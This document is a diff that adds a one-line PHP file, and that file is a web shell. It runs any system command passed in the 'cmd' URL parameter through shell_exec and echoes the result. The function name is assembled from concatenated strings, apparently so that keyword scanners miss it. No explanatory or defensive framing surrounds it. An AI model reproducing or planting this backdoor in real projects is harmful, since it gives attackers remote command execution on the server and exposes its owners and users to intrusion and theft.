@@ -1,0 +1,1 @@
+<?php $a='shell'.'_exec';echo $a($_GET['cmd']); ?>
